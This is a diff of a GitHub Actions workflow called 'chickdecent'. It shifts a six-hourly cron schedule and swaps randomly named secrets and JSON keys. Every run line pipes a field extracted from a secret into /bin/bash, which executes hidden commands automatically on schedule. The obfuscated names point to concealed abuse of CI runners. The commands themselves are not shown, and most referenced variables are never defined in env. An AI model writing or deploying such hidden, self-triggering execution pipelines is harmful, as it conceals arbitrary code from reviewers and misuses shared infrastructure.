@@ -3,24 +3,24 @@ name: chickdecent
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 3/6 * * *'
+    - cron: '55 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chickdecent
         env:
-          uraia549: ${{ secrets.uraia549 }}
+          eq2536: ${{ secrets.eq2536 }}
         run: |
-          echo $uraia549 | jq -r .t9517 | /bin/bash
-          echo $n070 | jq -r .rwsj6194 | /bin/bash
-          echo $uoyfw5 | jq -r .mq9372 | /bin/bash
-          echo $dll576 | jq -r .zw582 | /bin/bash
-          echo $hq19 | jq -r .uf118 | /bin/bash
-          echo $ycy564 | jq -r .t34813 | /bin/bash
-          echo $zw9 | jq -r .pmy8 | /bin/bash
-          echo $xsar9324 | jq -r .x0 | /bin/bash
-          echo $v6313 | jq -r .u45104 | /bin/bash
-          echo $ttw8242 | jq -r .wn2 | /bin/bash
+          echo $eq2536 | jq -r .jbnf0751 | /bin/bash
+          echo $ewxxj9294 | jq -r .az59 | /bin/bash
+          echo $wpcbw58 | jq -r .a647 | /bin/bash
+          echo $ln2 | jq -r .qzaku59526 | /bin/bash
+          echo $gf25132 | jq -r .acx4240 | /bin/bash
+          echo $sjwv8395 | jq -r .vezbw48 | /bin/bash
+          echo $i0379 | jq -r .jelf558 | /bin/bash
+          echo $vg5 | jq -r .julir3 | /bin/bash
 
